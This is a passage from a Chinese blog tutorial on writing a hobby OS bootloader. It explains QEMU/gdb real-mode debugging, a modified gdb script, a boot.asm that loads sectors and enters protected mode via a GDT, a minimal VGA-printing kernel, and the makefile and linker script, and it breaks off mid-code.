<p>这里我们采用qemu虚拟化平台来跑我们的内核，在qemu启动时加上-s选项就可以启动一个调试的服务在1234端口，我们可以用gdb来进行连接调试。这里layout
asm来查看原始的汇编代码，layout regs来查看寄存器情况。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -fda $(TARGET)  -s -S</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> gdb kernel.elf \</span><br><span class="line">        -ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">        -ex <span class="string">&#x27;set architecture i8086&#x27;</span> \</span><br><span class="line">        -ex <span class="string">&#x27;layout asm&#x27;</span> \</span><br><span class="line">        -ex <span class="string">&#x27;layout regs&#x27;</span> \</span><br><span class="line">        -ex <span class="string">&#x27;break *(0x7c00)&#x27;</span> \</span><br><span class="line">        -ex <span class="string">&#x27;continue&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>但实际发现即使我们指定了i8086的架构，gdb还是会以32位进行解析，<code>gdb</code>不执行分段:偏移计算，所以这里用了一个好用的<a class="link" 
 href="https://ternet.fr/media/gdb_init_real_mode.txt" >脚本<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>来扩充gdb显示16位下的assembly。其中这个脚本里我们需要把里面的<code>set architecture i8086</code>的注释取消掉。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428204029759.png"
                      class=""
                >
<p>还需要搭配使用两个文件，将这两个文件以及上面给的脚本放在运行gdb的同一个目录下（也可以绝对路径直接指定好）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE target SYSTEM &quot;gdb-target.dtd&quot;&gt;&lt;target&gt;&lt;architecture&gt;i8086&lt;/architecture&gt;&lt;xi:include href=&quot;i386-32bit.xml&quot;/&gt;&lt;/target&gt;&#x27;</span> &gt; target.xml</span><br><span class="line">wget https://raw.githubusercontent.com/qemu/qemu/master/gdb-xml/i386-32bit.xml</span><br></pre></td></tr></table></figure></div>
<p>新的使用方式如下，在使用前需要关闭其它gdb插件，比如pwndbg和gef等，否则会报double
free错误：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/bash</span></span><br><span class="line"></span><br><span class="line">gdb -ix <span class="string">&quot;gdb_init_real_mode.txt&quot;</span> \</span><br><span class="line">    -ex <span class="string">&quot;set tdesc filename target.xml&quot;</span> \</span><br><span class="line">    -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">    -ex <span class="string">&quot;br *0x7c00&quot;</span> -ex <span class="string">&quot;c&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>然后就能进行调试，可以正常显示16位的寄存器。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428211052544.png"
                      class=""
                >
<p>实际后面调试时还是会存在gdb错误解析的问题，比如我们切换到保护模式之后，CS代码段寄存器存的0x8应该是表示<strong>选择子</strong>，但实际由于用了上面的实模式显示，所以会在code段显示到别的地方（但IP还是正确的，就是每次执行后我们都要手动打印对应地址的指令比较麻烦）。实际上我们切换到保护模式后就可以退出这个real-mode-gdb了。这里我观察了下扩展脚本的源码，发现问题如下，其$rip一开始就设置成实模式的寻址方式，那么后面code展现就会出现问题。</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">define compute_regs</span><br><span class="line">  set $rax = ((unsigned long)$eax &amp; 0xFFFF)</span><br><span class="line">  set $rbx = ((unsigned long)$ebx &amp; 0xFFFF)</span><br><span class="line">  set $rcx = ((unsigned long)$ecx &amp; 0xFFFF)</span><br><span class="line">  set $rdx = ((unsigned long)$edx &amp; 0xFFFF)</span><br><span class="line">  set $rsi = ((unsigned long)$esi &amp; 0xFFFF)</span><br><span class="line">  set $rdi = ((unsigned long)$edi &amp; 0xFFFF)</span><br><span class="line">  set $rbp = ((unsigned long)$ebp &amp; 0xFFFF)</span><br><span class="line">  set $rsp = ((unsigned long)$esp &amp; 0xFFFF)</span><br><span class="line">  set $rcs = ((unsigned long)$cs &amp; 0xFFFF)</span><br><span class="line">  set $rds = ((unsigned long)$ds &amp; 0xFFFF)</span><br><span class="line">  set $res = ((unsigned long)$es &amp; 0xFFFF)</span><br><span class="line">  set $rss = ((unsigned long)$ss &amp; 0xFFFF)</span><br><span class="line">  set $rip = ((((unsigned long)$cs &amp; 0xFFFF) &lt;&lt; 4) + ((unsigned long)$eip &amp; 0xFFFF)) &amp; $ADDRESS_MASK</span><br><span class="line">  set $r_ss_sp = ((((unsigned long)$ss &amp; 0xFFFF) &lt;&lt; 4) + ((unsigned long)$esp &amp; 0xFFFF)) &amp; $ADDRESS_MASK</span><br><span class="line">  set $r_ss_bp = ((((unsigned long)$ss &amp; 0xFFFF) &lt;&lt; 4) + ((unsigned long)$ebp &amp; 0xFFFF)) &amp; $ADDRESS_MASK</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">define context</span><br><span class="line">  printf &quot;---------------------------[ STACK ]---\n&quot;</span><br><span class="line">  _dump_memw $r_ss_sp 8</span><br><span class="line">  printf &quot;\n&quot;</span><br><span class="line">  set $_a = $r_ss_sp + 16</span><br><span class="line">  _dump_memw $_a 8</span><br><span class="line">  printf &quot;\n&quot;</span><br><span class="line">  printf &quot;---------------------------[ DS:SI ]---\n&quot;</span><br><span class="line">  print_data $ds $rsi</span><br><span class="line">  printf &quot;---------------------------[ ES:DI ]---\n&quot;</span><br><span class="line">  print_data $es $rdi</span><br><span class="line"></span><br><span class="line">  printf &quot;----------------------------[ CPU ]----\n&quot;</span><br><span class="line">  print_regs</span><br><span class="line">  print_eflags</span><br><span class="line">  printf &quot;---------------------------[ CODE ]----\n&quot;</span><br><span class="line"></span><br><span class="line">  set $_code_size = $CODE_SIZE</span><br><span class="line"></span><br><span class="line">  # disassemble</span><br><span class="line">  # first call x/i with an address</span><br><span class="line">  # subsequent calls to x/i will increment address</span><br><span class="line">  if ($_code_size &gt; 0)</span><br><span class="line">    x /i $rip</span><br><span class="line">    set $_code_size--</span><br><span class="line">  end</span><br><span class="line">  while ($_code_size &gt; 0)</span><br><span class="line">    x /i</span><br><span class="line">    set $_code_size--</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">define hook-stop</span><br><span class="line">  compute_regs</span><br><span class="line">  if ($SHOW_CONTEXT &gt; 0)</span><br><span class="line">    context</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>那么我们只需将脚本经过如下修改，就可以让code最后显示正确了，这里默认cs为0说明是实模式，因为在保护模式下0号段选择器是空。</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">define compute_regs</span><br><span class="line">  set $rax = ((unsigned long)$eax &amp; 0xFFFF)</span><br><span class="line">  set $rbx = ((unsigned long)$ebx &amp; 0xFFFF)</span><br><span class="line">  set $rcx = ((unsigned long)$ecx &amp; 0xFFFF)</span><br><span class="line">  set $rdx = ((unsigned long)$edx &amp; 0xFFFF)</span><br><span class="line">  set $rsi = ((unsigned long)$esi &amp; 0xFFFF)</span><br><span class="line">  set $rdi = ((unsigned long)$edi &amp; 0xFFFF)</span><br><span class="line">  set $rbp = ((unsigned long)$ebp &amp; 0xFFFF)</span><br><span class="line">  set $rsp = ((unsigned long)$esp &amp; 0xFFFF)</span><br><span class="line">  set $rcs = ((unsigned long)$cs &amp; 0xFFFF)</span><br><span class="line">  set $rds = ((unsigned long)$ds &amp; 0xFFFF)</span><br><span class="line">  set $res = ((unsigned long)$es &amp; 0xFFFF)</span><br><span class="line">  set $rss = ((unsigned long)$ss &amp; 0xFFFF)</span><br><span class="line">  if $rcs &gt; 0</span><br><span class="line">    set $rip = ((unsigned long)$eip &amp; 0xFFFF) </span><br><span class="line">    set $r_ss_sp = ((unsigned long)$esp &amp; 0xFFFF) </span><br><span class="line">    set $r_ss_bp = ((unsigned long)$ebp &amp; 0xFFFF)</span><br><span class="line">    set architecture i386</span><br><span class="line">  else</span><br><span class="line">    set $rip = ((((unsigned long)$cs &amp; 0xFFFF) &lt;&lt; 4) + ((unsigned long)$eip &amp; 0xFFFF)) &amp; $ADDRESS_MASK</span><br><span class="line">    set $r_ss_sp = ((((unsigned long)$ss &amp; 0xFFFF) &lt;&lt; 4) + ((unsigned long)$esp &amp; 0xFFFF)) &amp; $ADDRESS_MASK</span><br><span class="line">    set $r_ss_bp = ((((unsigned long)$ss &amp; 0xFFFF) &lt;&lt; 4) + ((unsigned long)$ebp &amp; 0xFFFF)) &amp; $ADDRESS_MASK</span><br><span class="line">    set architecture i8086</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>也可以在 QEMU Monitor（通常是 <code>Ctrl-Alt-2</code> 切换到 QEMU
Monitor 窗口）里使用下面的指令来查看寄存器信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">info registers</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428211923276.png"
                      class=""
                >
<h3 id="bootloader编写">bootloader编写</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; boot.asm - 启动程序（16 位实模式）</span><br><span class="line"></span><br><span class="line">[org 0x7C00]             ; BIOS 会把这段代码加载到 0x7C00</span><br><span class="line">[BITS 16]</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    cli                 ; 关中断</span><br><span class="line">    xor ax, ax</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov ss, ax</span><br><span class="line">    mov sp, 0x7000      ; 设置堆栈</span><br><span class="line"></span><br><span class="line">    ; 读取 stage2 (加载 stage2.asm 编译后的镜像) 到 0x8000</span><br><span class="line">    mov ah, 0x02         ; BIOS function: read sector</span><br><span class="line">    mov al, 2            ; 读取 2 个扇区</span><br><span class="line">    mov ch, 0            ; 柱面</span><br><span class="line">    mov cl, 2            ; 起始扇区（第2个扇区）</span><br><span class="line">    mov dh, 0            ; 磁头</span><br><span class="line">    mov dl, 0x00         ; 软盘</span><br><span class="line">    mov bx, 0x8000       ; 加载地址</span><br><span class="line">    int 0x13</span><br><span class="line">    jc disk_error</span><br><span class="line"></span><br><span class="line">    ; 读取 kernel (加载 kernel.c 编译后的镜像) 到 0x10000</span><br><span class="line">    mov ah, 0x02         ; BIOS function: read sector</span><br><span class="line">    mov al, 5           ; 读取 5 个扇区</span><br><span class="line">    mov ch, 0            ; 柱面</span><br><span class="line">    mov cl, 4            ; 起始扇区（第4个扇区）</span><br><span class="line">    mov dh, 0            ; 磁头</span><br><span class="line">    mov dl, 0x00         ; 软盘</span><br><span class="line">    mov bx, 0x9000       ; 加载地址</span><br><span class="line">    int 0x13</span><br><span class="line">    jc disk_error</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lgdt [gdt_descriptor]   ; 加载全局描述符表（GDT）</span><br><span class="line"></span><br><span class="line">    ; 开启保护模式</span><br><span class="line">    mov eax, cr0</span><br><span class="line">    or eax, 1</span><br><span class="line">    mov cr0, eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; 使用远跳转更新 CS</span><br><span class="line">    jmp 0x08:protected_mode_entry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[BITS 32]</span><br><span class="line">protected_mode_entry:</span><br><span class="line">    ; 设置段寄存器（CS 已经在 far jump 中设置了）</span><br><span class="line">    mov ax, 0x10</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ss, ax</span><br><span class="line"></span><br><span class="line">    mov esp, 0x90000         ; 设置新栈</span><br><span class="line"></span><br><span class="line">    jmp 0x8000    ; 跳转到 stage2 加载地址</span><br><span class="line"></span><br><span class="line">disk_error:</span><br><span class="line">    hlt</span><br><span class="line">    jmp $</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; ----- GDT -----</span><br><span class="line">gdt_start:</span><br><span class="line">gdt_null:               ; 空描述符</span><br><span class="line">    dq 0</span><br><span class="line"></span><br><span class="line">gdt_code:               ; 代码段描述符（base=0, limit=4GB, type=code）</span><br><span class="line">    dw 0xFFFF           ; limit low 16bits</span><br><span class="line">    dw 0x0000           ; base low 16bits</span><br><span class="line">    db 0x00             ; base middle 8bits</span><br><span class="line">    db 10011010b        ; access bytes 8bits</span><br><span class="line">    db 11001111b        ; limit high 4bits + flags 4bits</span><br><span class="line">    db 0x00             ; base high 8bits</span><br><span class="line"></span><br><span class="line">gdt_data:</span><br><span class="line">    dw 0xFFFF</span><br><span class="line">    dw 0x0000</span><br><span class="line">    db 0x00</span><br><span class="line">    db 10010010b   ; P=1, DPL=0, S=1(data), DC=0(grows up), RW=1</span><br><span class="line">    db 11001111b   ; G=1, D/B=1, limit_high=0xF</span><br><span class="line">    db 0x00</span><br><span class="line"></span><br><span class="line">gdt_end:</span><br><span class="line"></span><br><span class="line">gdt_descriptor:</span><br><span class="line">    dw gdt_end - gdt_start      ; limit</span><br><span class="line">    dd gdt_start                ; base</span><br><span class="line"></span><br><span class="line">; ----- 填充到 510 字节 -----</span><br><span class="line">times 510 - ($ - $$) db 0</span><br><span class="line">dw 0xAA55                     ; MBR 魔数</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; stage2.asm</span><br><span class="line"></span><br><span class="line">[BITS 32]</span><br><span class="line">start:</span><br><span class="line">    jmp 0x08:0x9000   ; 跳转到 kernel_main</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_screen</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_string</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    print_string(<span class="string">&quot;Hello, Kernel!&quot;</span>);  <span class="comment">// 打印一行字符</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_screen</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *video = (<span class="type">unsigned</span> <span class="type">short</span> *) <span class="number">0xB8000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span> * <span class="number">25</span>; i++) &#123;</span><br><span class="line">        video[i] = <span class="number">0x0F20</span>;  <span class="comment">// 清屏，0x0F 是前景色，0x20 是空格</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_string</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *video = (<span class="type">unsigned</span> <span class="type">short</span> *) <span class="number">0xB8000</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        *video = (<span class="number">0x0F</span> &lt;&lt; <span class="number">8</span>) | *str;  <span class="comment">// 设置字符和颜色</span></span><br><span class="line">        video++;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># makefile</span></span><br><span class="line">DIR := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINK_LD := <span class="variable">$(DIR)</span>/linker.ld</span><br><span class="line">TARGET := <span class="variable">$(DIR)</span>/focus-os.img</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: all clean run</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="section">boot.bin: boot.asm</span></span><br><span class="line">	nasm -f bin boot.asm -o boot.bin</span><br><span class="line"></span><br><span class="line"><span class="section">stage2.bin: stage2.asm</span></span><br><span class="line">	nasm -f bin stage2.asm -o stage2.bin</span><br><span class="line"></span><br><span class="line"><span class="section">kernel.o: kernel.c</span></span><br><span class="line">	gcc -m32 -g -ffreestanding -c kernel.c -o kernel.o</span><br><span class="line"></span><br><span class="line"><span class="section">kernel.bin: kernel.o linker.ld</span></span><br><span class="line">	ld -m elf_i386 -g -T <span class="variable">$(LINK_LD)</span> -o kernel.elf kernel.o</span><br><span class="line">	objcopy -O binary kernel.elf kernel.bin</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: boot.bin kernel.bin stage2.bin</span><br><span class="line">	dd if=/dev/zero of=<span class="variable">$(TARGET)</span> bs=512 count=2880                    </span><br><span class="line">	dd if=boot.bin of=<span class="variable">$(TARGET)</span> bs=512 count=1 conv=notrunc           </span><br><span class="line">	dd if=stage2.bin of=<span class="variable">$(TARGET)</span> bs=512 count=2 seek=1 conv=notrunc  </span><br><span class="line">	dd if=kernel.bin of=<span class="variable">$(TARGET)</span> bs=512 count=5 seek=3 conv=notrunc          </span><br><span class="line"></span><br><span class="line"><span class="section">run:</span></span><br><span class="line">	qemu-system-i386 -fda <span class="variable">$(TARGET)</span>  -s -S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.bin *.o *.elf <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># linker.ld</span><br><span class="line">ENTRY(kernel_main)       /* 程序入口，定义了主函数 */</span><br><span class="line"></span><br><span class="line">SECTIONS &#123;</span><br><span class="line">    . = 0x0;      /* 从内存地址 0x0 开始加载 */</span><br><span class="line"></span><br><span class="line">    .text : &#123;</span><br><span class="line">        *(.text)     /* 收集所有 .text 段（代码段） */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .rodata : &#123;</span><br><span class="line">        *(.rodata)   /* 只读数据，比如字符串常量 */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .data : &#123;</span><br><span class="line">        *(.data)     /* 已初始化的数据段 */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .bss : &#123;</span><br><span class="line">        *(.bss COMMON) /* 未初始化的数据段（清零） */</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>我们一步一步拆开来看，首先<code>[org 0x7C00]</code>会让BIOS把这段代码加载到固定的0x7c00地址处，即我们的IP从0x7c00开始，然后后面的<code>[BITS 16]</code>指定了目前是16位的实模式。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; boot.asm - 启动程序（16 位实模式）</span><br><span class="line"></span><br><span class="line">[org 0x7C00]             ; BIOS 会把这段代码加载到 0x7C00</span><br><span class="line">[BITS 16]</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    cli                 ; 关中断</span><br><span class="line">    xor ax, ax</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov ss, ax</span><br><span class="line">    mov sp, 0x7000      ; 设置堆栈</span><br></pre></td></tr></table></figure></div>
<p>然后是通过从软盘读取对应的其它部分到内存，这部分需要在切换到保护模式之前完成，因为到了保护模式之后就不能用BIOS的int
0x13中断来加载内存了。这里加载部分需要配合后面虚拟软盘设计进行填入参数，这里我们只用先知道可以把别的编译好的二进制程序加载到对应内存中即可，后面我们就可以通过固定的地址跳转来转到别的二进制程序中。这里我们先采用软盘模式启动，所以这里dl设置为0。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 读取 stage2 (加载 stage2.asm 编译后的镜像) 到 0x8000</span><br><span class="line">    mov ah, 0x02         ; BIOS function: read sector</span><br><span class="line">    mov al, 2            ; 读取 2 个扇区</span><br><span class="line">    mov ch, 0            ; 柱面</span><br><span class="line">    mov cl, 2            ; 起始扇区（第2个扇区）</span><br><span class="line">    mov dh, 0            ; 磁头</span><br><span class="line">    mov dl, 0x00         ; 软盘</span><br><span class="line">    mov bx, 0x8000       ; 加载地址</span><br><span class="line">    int 0x13</span><br><span class="line">    jc disk_error</span><br><span class="line"></span><br><span class="line">    ; 读取 kernel (加载 kernel.c 编译后的镜像) 到 0x10000</span><br><span class="line">    mov ah, 0x02         ; BIOS function: read sector</span><br><span class="line">    mov al, 5           ; 读取 5 个扇区</span><br><span class="line">    mov ch, 0            ; 柱面</span><br><span class="line">    mov cl, 4            ; 起始扇区（第4个扇区）</span><br><span class="line">    mov dh, 0            ; 磁头</span><br><span class="line">    mov dl, 0x00         ; 软盘</span><br><span class="line">    mov bx, 0x9000       ; 加载地址</span><br><span class="line">    int 0x13</span><br><span class="line">    jc disk_error</span><br></pre></td></tr></table></figure></div>
<p>实际上我们在进行调试时，遇到int的中断，需要手动在它后面一个指令打断点再continue，否则si/ni会跳转到一些奇怪的地方。这里我们跟进到boot.asm的int
0x13之后，发现确实把stage2.asm的内容加载到了0x8000位置处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250429121228091.png"
                      class=""
                >
<p>然后加载GDT后修改cr0开启保护模式，用远跳转跳到<strong>protected_mode_entry</strong>处并更新CS为我们的<strong>Selector
1</strong>。GDT表的设置主要是先把第一个8字节处置空，然后我们用到两个描述符，一个存代码一个存数据。其中我们limit位都设置的很大，为0x11ffff，并且base都置零，这里不同的gdt描述符的区域可以重叠，后续到了内核才会对不同内存段进行区分，这里的描述符区别在于access
bytes和后面flags里规定的读写权限以及一些配置。然后最后需要有一个<strong>gdt_descriptor</strong>，其base字段指向gdb描述符表。然后就可以<code>lgdt [gdt_descriptor]</code>来加载全局描述符表了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lgdt [gdt_descriptor]   ; 加载全局描述符表（GDT）</span><br><span class="line"></span><br><span class="line">    ; 开启保护模式</span><br><span class="line">    mov eax, cr0</span><br><span class="line">    or eax, 1</span><br><span class="line">    mov cr0, eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; 使用远跳转更新 CS</span><br><span class="line">    jmp 0x08:protected_mode_entry</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">; ----- GDT -----</span><br><span class="line">gdt_start:</span><br><span class="line">gdt_null:               ; 空描述符</span><br><span class="line">    dq 0</span><br><span class="line"></span><br><span class="line">gdt_code:               ; 代码段描述符（base=0, type=code）</span><br><span class="line">    dw 0xFFFF           ; limit low 16bits</span><br><span class="line">    dw 0x0000           ; base low 16bits</span><br><span class="line">    db 0x00             ; base middle 8bits</span><br><span class="line">    db 10011010b        ; access bytes 8bits</span><br><span class="line">    db 11001111b        ; limit high 4bits + flags 4bits</span><br><span class="line">    db 0x00             ; base high 8bits</span><br><span class="line"></span><br><span class="line">gdt_data:</span><br><span class="line">    dw 0xFFFF</span><br><span class="line">    dw 0x0000</span><br><span class="line">    db 0x00</span><br><span class="line">    db 10010010b   ; P=1, DPL=0, S=1(data), DC=0(grows up), RW=1</span><br><span class="line">    db 11001111b   ; G=1, D/B=1, limit_high=0xF</span><br><span class="line">    db 0x00</span><br><span class="line"></span><br><span class="line">gdt_end:</span><br><span class="line"></span><br><span class="line">gdt_descriptor:</span><br><span class="line">    dw gdt_end - gdt_start      ; limit</span><br><span class="line">    dd gdt_start                ; base</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后进入保护模式后，就可以跳转到stage2进行执行，跳转之前需要设置好各个段寄存器指向gdt_data，然后把esp指向新的栈空间。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[BITS 32]</span><br><span class="line">protected_mode_entry:</span><br><span class="line">    ; 设置段寄存器（CS 已经在 far jump 中设置了）</span><br><span class="line">    mov ax, 0x10</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ss, ax</span><br><span class="line"></span><br><span class="line">    mov esp, 0x90000         ; 设置新栈</span><br><span class="line"></span><br><span class="line">    jmp 0x8000    ; 跳转到 stage2 加载地址</span><br></pre></td></tr></table></figure></div>
<p>stage2目前先不用加入别的功能，先直接跳转到内核。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; stage2.asm</span><br><span class="line"></span><br><span class="line">[BITS 32]</span><br><span class="line">start:</span><br><span class="line">    jmp 0x08:0x9000   ; 跳转到 kernel_main</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最后就能进入进行执行，注意这里我们不能使用c的一些标准库进行输出，而是得往0xB8000这个<strong>Video
Memory</strong>的RAM中写入，其格式是一个字节表示颜色，一个字节表示字符，所以我们可以用short的数据类型存每个字符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel.c</span></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_screen</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_string</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    print_string(<span class="string">&quot;Hello, Kernel!&quot;</span>);  <span class="comment">// 打印一行字符</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_screen</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *video = (<span class="type">unsigned</span> <span class="type">short</span> *) <span class="number">0xB8000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span> * <span class="number">25</span>; i++) &#123;</span><br><span class="line">        video[i] = <span class="number">0x0F20</span>;  <span class="comment">// 清屏，0x0F 是前景色，0x20 是空格</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_string</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *video = (<span class="type">unsigned</span> <span class="type">short</span> *) <span class="number">0xB8000</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        *video = (<span class="number">0x0F</span> &lt;&lt; <span class="number">8</span>) | *str;  <span class="comment">// 设置字符和颜色</span></span><br><span class="line">        video++;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 